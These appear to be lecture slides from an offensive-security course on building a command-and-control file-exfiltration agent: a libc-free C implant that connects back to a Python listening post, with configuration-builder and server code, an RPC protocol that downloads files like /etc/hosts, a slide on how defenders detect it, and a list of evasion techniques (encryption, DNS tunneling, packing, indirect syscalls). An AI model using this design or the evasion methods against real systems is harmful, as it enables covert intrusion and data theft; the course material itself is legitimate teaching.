

---
<!-- slide template="[[Split Vertical]]" -->

::: title

#### File Agent: 

:::
::: left
- Remote file access agent (client) and server
- RPC protocol over TCP
- Commands: ls, pwd, stats, download, mingrep, tailf
- No libc dependencies
- Compile-time configuration


:::
::: right

![[man_poertry.png|500]]


:::




---
<!-- slide template="[[Base Slide]]" -->

::: title

#### System Overview

:::

![[agent_system_overview.md]]

**Key components:**
1. **builder.py** - Generates compile-time configuration
2. **server.py** - Python server with interactive REPL
3. **agent.c** - C program with no libc dependencies


---
<!-- slide template="[[Split Vertical]]" -->

::: title

#### builder.py: Configuration Generator

:::
::: left
**Generates config.h with:**
- IP address as 4 octets
- Port in network byte order (big-endian)
- Password as byte array
- All as `#define` constants

**Usage:**
```bash
$ python3 builder.py 192.168.1.100 4444 DEADBEEF
```


:::
::: right

**Example output:**

```c
/* Auto-generated by builder.py */
#ifndef CONFIG_H
#define CONFIG_H

/* Server IP: 192.168.1.100 */
#define SERVER_IP_OCTET_0 192
#define SERVER_IP_OCTET_1 168
#define SERVER_IP_OCTET_2 1
#define SERVER_IP_OCTET_3 100

/* Server Port: 4444 (NBO: 0x5c11) */
#define SERVER_PORT 4444
#define SERVER_PORT_NBO 0x5c11

/* Authentication password */
#define AUTH_PASSWORD_LEN 4
#define AUTH_PASSWORD { 0xDE, 0xAD, 0xBE, 0xEF }

/* Timeout for auth (seconds) */
#define AUTH_TIMEOUT_SEC 2

#endif
```

:::


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### builder.py Implementation

:::

```python
import sys
import struct

def ip_to_bytes(ip_str):
    """Convert IP string to 4 octets."""
    parts = ip_str.split('.')
    if len(parts) != 4:
        raise ValueError("Invalid IP address")
    octets = [int(part) for part in parts]
    if not all(0 <= octet <= 255 for octet in octets):
        raise ValueError("IP octets must be 0-255")
    return octets

def port_to_nbo(port):
    """Convert port to network byte order (big-endian)."""
    if not (0 <= port <= 65535):
        raise ValueError("Port must be 0-65535")
    # Pack as big-endian unsigned short
    packed = struct.pack('>H', port)
    # Return as hex string (e.g., 0x5c11)
    return '0x' + packed.hex()

def password_to_bytes(password):
    """Convert password string to byte array."""
    return [ord(c) for c in password]

def generate_config(ip, port, password):
    """Generate config.h content."""
    octets = ip_to_bytes(ip)
    nbo = port_to_nbo(port)
    pw_bytes = password_to_bytes(password)

    config = f'''/* Auto-generated by builder.py */
#ifndef CONFIG_H
#define CONFIG_H

/* Server IP: {ip} */
#define SERVER_IP_OCTET_0 {octets[0]}
#define SERVER_IP_OCTET_1 {octets[1]}
#define SERVER_IP_OCTET_2 {octets[2]}
#define SERVER_IP_OCTET_3 {octets[3]}

/* Server Port: {port} (NBO: {nbo}) */
#define SERVER_PORT {port}
#define SERVER_PORT_NBO {nbo}

/* Authentication password */
#define AUTH_PASSWORD_LEN {len(pw_bytes)}
#define AUTH_PASSWORD {{ {', '.join(f'0x{b:02X}' for b in pw_bytes)} }}

#endif
'''
    return config
```


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Agent Build Workflow

:::

![[agent_build_workflow.md]]

**Compilation flags:**
```bash
gcc -nostdlib -static  -o agent agent.c
strip agent
```



---
<!-- slide template="[[Base Slide]]" -->

::: title

#### RPC Protocol Design Philosophy

:::

**Design Goals:**
1. **Simple** - Easy to parse and implement
2. **Fixed-size** - No buffer overflow vulnerabilities
3. **Efficient** - Minimal overhead
4. **Extensible** - Easy to add new commands


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### RPC Design  

:::

| Aspect         | Choice               | Alternative        | Why?                             |
| -------------- | -------------------- | ------------------ | -------------------------------- |
| Message size   | Fixed 4096 bytes     | Variable (TLV)     | Simpler parsing, page-aligned    |
| Byte order     | Network (big-endian) | Host               | Cross-platform compatibility     |
| Communication  | Blocking             | Non-blocking       | Simpler code, single-threaded    |
| Data format    | Binary               | Text (JSON)        | Smaller, faster, less detectable |
| Error handling | Status codes         | Exceptions         | More control, C-friendly         |
| Authentication | Password bytes       | Challenge/response | Simple, fits our threat model    |


---
<!-- slide template="[[Split Vertical]]" -->

::: title

#### RPC Protocol Structures

:::
::: left

**Commands:**
```c
#define CMD_GET_FILE_STATS  0x01
#define CMD_LS              0x02
#define CMD_PWD             0x03
#define CMD_DOWNLOAD_FILE   0x04
#define CMD_MINGREP         0x05
#define CMD_TAILF           0x06
#define CMD_CANCEL          0x07
#define CMD_EXIT            0x08
```

**Status codes:**
```c
#define STATUS_OK           0x00
#define STATUS_ERROR        0x01
#define STATUS_MORE_DATA    0x02
```

**Fixed sizes:**
```c
#define RPC_DATA_SIZE 4088
#define RPC_REQUEST_SIZE 4096
#define RPC_RESPONSE_SIZE 4096
```

:::
::: right

```c
struct rpc_request {
    uint8_t  cmd_type;      // 1 byte
    uint8_t  reserved[3];   // 3 bytes padding
    uint32_t data_len;      // 4 bytes (NBO!)
    char     data[4088];    // Variable data
} __attribute__((packed));  // Total: 4096
```

**Response structure:**
```c
struct rpc_response {
    uint8_t  status;        // 1 byte
    uint8_t  reserved[3];   // 3 bytes padding
    uint32_t data_len;      // 4 bytes (NBO!)
    char     data[4088];    // Variable data
} __attribute__((packed));  // Total: 4096
```

**Why `__attribute__((packed))`?**
- Prevents compiler from adding padding
- Ensures consistent layout across platforms

:::


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Packet Structure Visualization

:::

**Request (4096 bytes):**
```
Byte offset:  0        1    2    3    4    5    6    7    8                      4095
             ┌────────┬─────────────┬────────────────┬──────────────────────────────┐
Field:       │cmd_type│  reserved   │   data_len     │           data               │
             │ uint8  │  uint8[3]   │   uint32_t     │          char[]              │
             │        │  (padding)  │ (network order)│        (4088 bytes)          │
             └────────┴─────────────┴────────────────┴──────────────────────────────┘
Example:     │  0x04  │ 00  00  00  │ 00  00  00  0E │ "/etc/passwd\0..."          │
             └────────┴─────────────┴────────────────┴──────────────────────────────┘
```

**Response (4096 bytes):**
```
Byte offset:  0        1    2    3    4    5    6    7    8                      4095
             ┌────────┬─────────────┬────────────────┬──────────────────────────────┐
Field:       │ status │  reserved   │   data_len     │           data               │
             │ uint8  │  uint8[3]   │   uint32_t     │          char[]              │
             │        │  (padding)  │ (network order)│        (4088 bytes)          │
             └────────┴─────────────┴────────────────┴──────────────────────────────┘
Example:     │  0x02  │ 00  00  00  │ 00  00  10  00 │ [4096 bytes of file data]   │
(MORE_DATA)  └────────┴─────────────┴────────────────┴──────────────────────────────┘
```

---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Alignment  

:::
- Struct size = 4096 bytes exactly (one memory page)
- Header = 8 bytes (cmd/status + padding + length)
- Payload = 4088 bytes

---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Authentication Flow

:::


![[agent_auth.excalidraw.svg]]




---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Agent Flow 

:::
**Pattern:**
1. Operator → Server: Human command
2. Server → Agent: Binary RPC request
3. Agent → Filesystem: Syscalls
4. Filesystem → Agent: Data
5. Agent → Server: Binary RPC response
6. Server → Operator: Human-readable output



---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Basic RPC Message Flow

:::

![[agent_flow.excalidraw.svg]]


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Chunked Download Flow

:::

![[rpc_download.excalidraw.svg]]


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Tailf with Cancellation

:::

![[rpc_tailf_cancellation.md]]

-  Using `poll()` to multiplex two event sources
- File changes (inotify)
- Network commands (socket)


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### File I/O Method Comparison

:::

**Three approaches for reading files:**

| Method            | Syscalls             | Memory             | Use Case                             | Pros                                   | Cons                  |
| ----------------- | -------------------- | ------------------ | ------------------------------------ | -------------------------------------- | --------------------- |
| **openat + read** | Multiple (per chunk) | Low (4KB)          | Streaming, network transfer, tail -f | Works for any size, pipe-compatible    | More context switches |
| **pread**         | Multiple (per read)  | Low                | Random access, databases             | Atomic, thread-safe, no f_pos mutation | Still many syscalls   |
| **mmap**          | 2 (mmap + munmap)    | High (entire file) | Pattern matching, search             | Fast, pointer arithmetic               | Not for huge files    |


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Suggested Implementation 

:::
```c
// DOWNLOAD_FILE: Stream over network
while ((n = syscall3(SYS_read, fd, buf, 4088)) > 0) {
    send_chunk(sockfd, buf, n);
}

// MINGREP: Fast search in memory
char *map = syscall6(SYS_mmap, 0, size, PROT_READ, MAP_PRIVATE, fd, 0);
char *match = memmem(map, size, pattern, pattern_len);

// TAILF: Read new appended data
syscall3(SYS_lseek, fd, 0, SEEK_END);  // Seek to end
while (1) {
    wait_for_modification();
    n = syscall3(SYS_read, fd, buf, 4096);  // Read new data
}
```


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Agent State Machine

:::

![[agent_state_machine.md]]

**State transitions:**
- Startup → Connecting → Authenticating → Authenticated → Command Loop
- Command Loop: Wait → Execute → Respond → Wait
- Special: Streaming state for long-running commands


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Agent Architecture Overview

:::

![[agent_architecture.md]]



---
<!-- slide template="[[Split Vertical]]" -->

::: title

#### Server Architecture (server.py)

:::
::: left

**Two components:**

**1. TCP Server**
```python
server_sock = socket.socket(
    socket.AF_INET,
    socket.SOCK_STREAM
)
server_sock.bind(('0.0.0.0', 4444))
server_sock.listen(5)

client_sock, addr = server_sock.accept()
```

**2. REPL Interface**
```python
while True:
    cmd = input("agent> ").strip()

    if cmd == "ls /tmp":
        req = RPCRequest(CMD_LS, "/tmp")
        send_request(client_sock, req)
        status, data = recv_response(client_sock)
        print(data.decode())
```

:::
::: right

**Key functions:**
- `send_request(sock, req)` - Serialize and send
- `recv_response(sock)` - Receive and deserialize
- `cmd_*` functions - One per command type

:::



---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Base RPC Helper

:::



```python
class RPCRequest:
    def __init__(self, cmd_type, data):
        self.cmd_type = cmd_type
        self.data = data.encode() if isinstance(data, str) else data

    def pack(self):
        data_len = len(self.data)
        # Struct: <B (cmd) 3x (pad) I (len)
        header = struct.pack('<B3xI', self.cmd_type, data_len)
        padded_data = self.data.ljust(4088, b'\x00')
        return header + padded_data

class RPCResponse:
    @staticmethod
    def unpack(data):
        status, data_len = struct.unpack('<B3xI', data[:8])
        payload = data[8:8+data_len]
        return status, payload
```

---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Complete Example Session

:::

**Terminal 1: Start server**
```bash
$ python3 server.py 4444
[*] Server listening on 0.0.0.0:4444
[*] Password: deadbeef
[*] Waiting for agent connection...

[+] Agent connected from 127.0.0.1:54321
Waiting for authentication (timeout: 2.0s)...
✓ Authentication successful

============================================================
Connected to agent. Type 'help' for commands.
============================================================
```

**Terminal 2: Start agent**
```bash
$ ./agent  # (config.h has server IP/port/password)
[Agent connects silently, waits for commands]
```


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Interactive session starts 

:::
**Terminal 1: Interactive session**
```bash
agent> pwd
[*] Getting current directory...
/home/user

agent> ls /tmp
[*] Listing directory: /tmp
[F] test.txt
[D] cache
[L] link_to_file
```


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Example Session (cont.)

:::

```bash
agent> stats /etc/passwd
[*] Getting stats for: /etc/passwd
Size: 2847
Mode: 644
UID: 0
GID: 0
Atime: 1696340000
Mtime: 1696340000

agent> download /etc/hosts
[*] Downloading file: /etc/hosts
  Received chunk 1: 256 bytes (total: 256 bytes)
✓ Download complete: 256 bytes in 1 chunks
  Saved as: downloaded_hosts

agent> mingrep /var/log/syslog error
[*] Searching '/var/log/syslog' for pattern: error
Line 42: Oct  1 12:34:56 kernel: USB device error
Line 108: Oct  1 14:22:11 systemd: Service failed with error

agent> tailf /var/log/messages
[*] Tailing file: /var/log/messages
    (Press Ctrl+C to cancel)
Oct  1 15:30:01 kernel: New USB device connected
Oct  1 15:30:05 NetworkManager: Connection activated
^C
[*] Sending cancel command...
  tailf cancelled

agent> exit
[*] Sending exit command...
Goodbye!
```


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Protocol Design Discussion

:::

**Think about these design choices:**

**1. Packet Size: Why 4096 bytes?**
- What if we used 512 bytes? 64KB? Variable length?
- Consider: syscall overhead, memory, network MTU
- Exercise: Calculate overhead for downloading a 1MB file with different packet sizes

**2. Blocking vs Non-blocking**
- Our agent blocks on recv(). What if server is slow?
- How would you add timeouts? (Hint: `poll` with timeout)
- Trade-off: Complexity vs responsiveness

---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Protocol Cont 

:::
**3. Error Handling**
- We use status codes (OK, ERROR, MORE_DATA). Why not errno values?
- What about partial failures? (e.g., half the directory listed)
- How to handle network errors mid-transfer?

**4. Security**
- Password is sent in plaintext. How to encrypt?
- Agent authenticates to server, but what about server → agent?
- How to prevent replay attacks?

**5. Extensibility**
- How to add a new command without breaking old agents?
- What if we need to send binary data with nulls?
- How to version the protocol?


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Advanced Discussion

:::

**Current approach: Fixed-size binary**
```
✅ Simple parsing
✅ No buffer overflows
✅ Predictable memory usage
❌ Wastes space for small messages
❌ Limited to 4088 bytes of data per message
```

**Alternative 1: Type-Length-Value (TLV)**
```c
struct tlv_message {
    uint8_t type;
    uint32_t length;  // Network byte order
    char value[];     // Variable length
};
```
✅ Efficient for variable data
❌ More complex parsing, potential for bugs


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### JSON 

:::
**Alternative 2: JSON over TCP**
```json
{"cmd": "ls", "path": "/tmp"}
```
✅ Human-readable, easy debugging
❌ Larger size, parsing overhead, obvious in traffic


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Wire Efficient Protocols 

:::
**Alternative 3: Protocol Buffers / MessagePack**
✅ Efficient, schema evolution, widely supported
❌ Dependency on external libraries (defeats no-libc goal)


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Discussion 

:::
**Which would you choose for a real C2?**



---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Common C2 IO patterns 

:::

**Pattern 1: Simple Request-Response**
```
Operator → Server → Agent → Execute → Response → Server → Operator
```
- Used by: pwd, ls, stats, mingrep
- Characteristics: Single round-trip, complete in one message


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Pattern 2: Chunked Streaming
:::

```
Operator → Server → Agent → Loop { Read chunk → Send chunk } → Server → Operator
```
- Used by: download
- Characteristics: Multiple responses, STATUS_MORE_DATA until STATUS_OK


---
<!-- slide template="[[Base Slide]]" -->

::: title

####   Pattern 3: Long-running with Cancellation

:::

```
Operator → Server → Agent → Loop { Poll events → Send updates } →
    Operator cancels → Server sends CMD_CANCEL → Agent stops
```
- Used by: tailf
- Characteristics: Indefinite duration, requires multiplexing with poll()


---
<!-- slide template="[[Base Slide]]" -->

::: title

####  Artifacts

:::

**How defenders detect this agent:**

| Detection Method | What They Look For            | Our Agent            |
| ---------------- | ----------------------------- | -------------------- |
| Network traffic  | Fixed 4096-byte packets       | ✅ Detectable pattern |
| Syscall tracing  | Direct syscalls (no libc)     | ✅ Suspicious pattern |
| Static analysis  | No imports, custom _start     | ✅ Red flag           |
| Behavior         | File enumeration (getdents64) | ✅ Suspicious         |
| Network          | Unencrypted C2 traffic        | ✅ Obvious            |

---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Basic Defense Evasion 

:::

- **Traffic obfuscation:**
	- Add random padding to vary packet size
	- Encrypt with TLS/SSL (looks like HTTPS)
	- Use DNS tunneling or protocol mimicry
- **Timing jitter:**
	- Random delays between commands
	- Mimic human behavior patterns
- **Syscall obfuscation:**
	- Indirect syscalls (jump to kernel)
	- System call proxying through other processes
- **Binary obfuscation:**
	- Pack/encrypt executable
	- Use polymorphic code




---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Final Thoughts & Next Steps

:::

**Remember:**
> The best defenders think like attackers.
> The best attackers understand defenders.

**Questions?**


---
<!-- slide template="[[Base Slide]]" -->

::: title

#### Capstone 0 

:::
- Fill out the survey (to be released after class) to tell me who is in your group 
- Join the CTFd instance (will be provisioned by Monday)
- By Monday  (hopefully Sunday) the formal requirements will be released 
- Captstone 0 is to built a basic exfiltration Agent given a python3  listening post
- this is not a hard requirement, but is designed to make it tractable to build the agent in  less than a week. 
- Homework is to prepare your agent 
- Agent will be built in gradescope  and deployed onto the course server. It will be unique to your group 
